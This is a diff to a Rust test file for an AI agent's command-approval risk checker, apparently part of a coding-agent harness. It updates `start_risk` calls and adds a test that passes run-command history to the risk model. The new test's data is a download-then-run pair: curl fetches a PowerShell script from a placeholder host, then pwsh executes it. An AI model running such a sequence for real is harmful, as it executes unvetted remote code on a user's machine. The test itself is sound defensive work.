@@ -34,6 +34,8 @@ struct FakeRisk {
     needs_decoding: f32,
     calls: AtomicUsize,
     lines: Mutex<Vec<String>>,
+    /// 流れと一緒に聞いた呼び出しの入力（state）。
+    contexts: Mutex<Vec<serde_json::Value>>,
 }
 
 impl FakeRisk {
@@ -48,6 +50,7 @@ impl FakeRisk {
             needs_decoding: 0.05,
             calls: AtomicUsize::new(0),
             lines: Mutex::new(Vec::new()),
+            contexts: Mutex::new(Vec::new()),
         })
     }
 
@@ -75,6 +78,8 @@ impl DecisionModel for FakeRisk {
             self.calls.fetch_add(1, Ordering::SeqCst);
             let line = state["command"].as_str().unwrap_or_default().to_string();
             self.lines.lock().unwrap().push(line);
+        } else {
+            self.contexts.lock().unwrap().push(state.clone());
         }
         tokio::time::sleep(self.delay).await;
         let score = match &self.reply {
@@ -133,7 +138,7 @@ async fn run_dialog(
     let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();
     let scope = open_scope(ReadScopeConfig::default());
     let cancel = CancellationToken::new();
-    let gate = start_risk(risk, &[], &tx, app, &cancel);
+    let gate = start_risk(risk, &tx, app, &cancel);
     assert!(
         start_summary(&summary, &tx, app, cache, &scope, false, None, gate).is_some(),
         "要約が起きなかった"
@@ -178,7 +183,7 @@ fn risk_line(app: &AppState) -> crate::app::ApprovalLine {
 fn without_a_model_the_machine_judgement_is_shown_at_once() {
     let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
     let mut dangerous = shell_app(DANGEROUS_LINE);
-    let gate = start_risk(None, &[], &tx, &mut dangerous, &CancellationToken::new());
+    let gate = start_risk(None, &tx, &mut dangerous, &CancellationToken::new());
     assert!(matches!(gate, Some(RiskGate::Ready(ref o)) if o.severity() == Severity::High));
     assert_eq!(view(&dangerous).title().1, Some(RiskLevel::Danger));
     let line = risk_line(&dangerous);
@@ -196,7 +201,7 @@ fn without_a_model_the_machine_judgement_is_shown_at_once() {
     );
 
     let mut plain = shell_app("ls");
-    start_risk(None, &[], &tx, &mut plain, &CancellationToken::new());
+    start_risk(None, &tx, &mut plain, &CancellationToken::new());
     assert_eq!(
         risk_line(&plain).text,
         "危険度: 要確認（機械判定のみ。判定モデルを使わない設定）"
@@ -210,7 +215,7 @@ fn without_a_model_the_machine_judgement_is_shown_at_once() {
 fn the_command_line_is_labeled_and_the_risk_line_follows_it() {
     let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
     let mut app = shell_app("ls");
-    start_risk(None, &[], &tx, &mut app, &CancellationToken::new());
+    start_risk(None, &tx, &mut app, &CancellationToken::new());
     let texts = body_texts(&app);
     // 見出し（ツール名は試験の部品`app_with`が決める）。
     assert!(texts[0].ends_with("（Exec）"), "{texts:?}");
@@ -339,7 +344,6 @@ async fn while_waiting_the_machine_judgement_is_shown_with_a_waiting_line() {
     let mut app = shell_app("ls");
     let gate = start_risk(
         Some(&risk_of(&slow)),
-        &[],
         &tx,
         &mut app,
         &CancellationToken::new(),
@@ -418,7 +422,7 @@ async fn the_same_material_is_not_asked_twice() {
     let cancel = CancellationToken::new();
     let mut app = shell_app(MODEL_ONLY_LINE);
     assert!(matches!(
-        start_risk(Some(&risk), &[], &tx, &mut app, &cancel),
+        start_risk(Some(&risk), &tx, &mut app, &cancel),
         Some(RiskGate::Pending(_))
     ));
     let event = rx.recv().await.expect("判定が届かない");
@@ -427,7 +431,7 @@ async fn the_same_material_is_not_asked_twice() {
 
     let mut again = shell_app(MODEL_ONLY_LINE);
     again.risk_seen = app.risk_seen.clone();
-    let gate = start_risk(Some(&risk), &[], &tx, &mut again, &cancel);
+    let gate = start_risk(Some(&risk), &tx, &mut again, &cancel);
     assert!(matches!(gate, Some(RiskGate::Ready(ref o)) if o.severity() == Severity::High));
     assert_eq!(fake.calls(), 1, "同じ材料を聞き直した");
     assert_eq!(severity(&again), Some(Severity::High));
@@ -441,7 +445,6 @@ async fn a_judgement_without_the_model_is_not_remembered() {
     let mut app = shell_app("ls");
     start_risk(
         Some(&risk_of(&fake)),
-        &[],
         &tx,
         &mut app,
         &CancellationToken::new(),
@@ -462,7 +465,7 @@ async fn a_judgement_without_the_model_is_not_remembered() {
 fn a_verdict_for_an_earlier_request_does_not_color_a_later_one() {
     let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
     let mut app = shell_app("ls");
-    start_risk(None, &[], &tx, &mut app, &CancellationToken::new());
+    start_risk(None, &tx, &mut app, &CancellationToken::new());
     let high = harness_engine::approval_risk::machine(&PermissionSubject::Command(
         CommandSubject::line_only(DANGEROUS_LINE),
     ))
@@ -496,7 +499,7 @@ async fn shell_lines_and_program_launches_are_judged_but_write_paths_are_not() {
         "git",
         vec!["status".into()],
     )));
-    assert!(start_risk(Some(&risk), &[], &tx, &mut program, &cancel).is_some());
+    assert!(start_risk(Some(&risk), &tx, &mut program, &cancel).is_some());
     assert!(body_texts(&program)
         .iter()
         .any(|t| t.starts_with("危険度: ")));
@@ -512,7 +515,7 @@ async fn shell_lines_and_program_launches_are_judged_but_write_paths_are_not() {
         PermissionSubject::Text("hello".into()),
     ] {
         let mut app = app_with(subject);
-        assert!(start_risk(Some(&risk), &[], &tx, &mut app, &cancel).is_none());
+        assert!(start_risk(Some(&risk), &tx, &mut app, &cancel).is_none());
         assert!(!body_texts(&app).iter().any(|t| t.starts_with("危険度: ")));
     }
     tokio::time::sleep(Duration::from_millis(50)).await;
@@ -526,7 +529,7 @@ async fn a_cancelled_check_sends_nothing() {
     let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();
     let cancel = CancellationToken::new();
     let mut app = shell_app(DANGEROUS_LINE);
-    let gate = start_risk(Some(&risk_of(&fake)), &[], &tx, &mut app, &cancel);
+    let gate = start_risk(Some(&risk_of(&fake)), &tx, &mut app, &cancel);
     assert!(gate.is_some());
     cancel.cancel();
     let none = tokio::time::timeout(Duration::from_millis(600), rx.recv()).await;
@@ -605,7 +608,6 @@ async fn a_cached_summary_is_still_reused_when_the_verdict_is_low_or_missing() {
         let mut again = shell_app("systeminfo");
         let gate = start_risk(
             Some(&risk_of(&fake)),
-            &[],
             &tx,
             &mut again,
             &CancellationToken::new(),
@@ -676,4 +678,46 @@ async fn a_located_payload_reaches_the_dialog_and_the_summary() {
         "{material}"
     );
     assert!(material.contains("Get-Date"), "{material}");
+}
+
+/// **実際に走ったコマンドは流れとして覚え、次の承認の流れの問いへ渡る。** 読むだけのツールは覚えない。
+#[tokio::test]
+async fn the_commands_that_ran_reach_the_sequence_question() {
+    let fake = FakeRisk::scoring(0.2);
+    let mut app = shell_app("pwsh -File a.ps1");
+    let started = |name: &str, subject: PermissionSubject| harness_core::AgentEvent::ToolStarted {
+        id: "call".into(),
+        name: name.into(),
+        subject: Some(subject),
+    };
+    app.apply(started(
+        "run_shell",
+        PermissionSubject::Command(CommandSubject::line_only("curl http://x/a.ps1 -o a.ps1")),
+    ));
+    app.apply(started(
+        "read_file",
+        PermissionSubject::Text("notes.txt".into()),
+    ));
+    let history = app.command_history.entries();
+    assert_eq!(history, ["curl http://x/a.ps1 -o a.ps1"]);
+
+    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();
+    start_risk(
+        Some(&risk_of(&fake)),
+        &tx,
+        &mut app,
+        &CancellationToken::new(),
+    );
+    while let Some(event) = rx.recv().await {
+        if matches!(event, BackgroundEvent::RiskReady { .. }) {
+            break;
+        }
+    }
+    let contexts = fake.contexts.lock().unwrap();
+    assert_eq!(contexts.len(), 1, "{contexts:?}");
+    assert_eq!(
+        contexts[0]["history"],
+        serde_json::json!(["curl http://x/a.ps1 -o a.ps1"])
+    );
+    assert_eq!(contexts[0]["command"], "pwsh -File a.ps1");
 }
